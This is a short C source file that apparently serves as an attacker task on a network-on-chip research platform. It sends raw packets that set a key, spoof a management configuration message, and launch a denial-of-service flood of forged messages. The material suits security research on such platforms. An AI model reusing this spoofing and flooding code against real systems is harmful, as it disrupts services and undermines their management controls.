/*
 * prod.c
 *
 *  Created on: 07/03/2013
 *      Author: mruaro
 */

#include <api.h>
#include <management_api.h>
#include <stdlib.h>

unsigned int msg[800];

int main()
{

	int msg_size;

	while(GetTick() < 200000);

	Puts("Generating set key msg\n");
	msg[0] =  0x20000 | 0x101;
	msg[1] = 2;
	msg[2] = 0x201;
	msg[3] = 0xfff;
	SendRaw(msg, 4);
	while(!NoCSendFree());
	Puts("Attack set key \n\n");

	Puts("\nGenerating spoofing msg\n");

	msg[0] = 0x10000 | 0x101;
	msg[1] = 2;
	msg[2] = 81271;
	msg[3] = 0xfff;

	SendRaw(msg, 4);
	while(!NoCSendFree());
	Puts("Attack config message sent\n");

	Puts("\nGenerating DoS flood\n");
	msg_size = 0;
	for(int i=0; i<200; i++){
		msg[msg_size++] = 0x10000 | 0x101;
		msg[msg_size++] = 2;
		msg[msg_size++] = 0x1111;
		msg[msg_size++] = 0xffff;
	}

	while(GetTick() < 300000);
	SendRaw(msg, msg_size);
	while(!NoCSendFree());


	Puts("Attack messages sent, task end\n");

	exit();
}


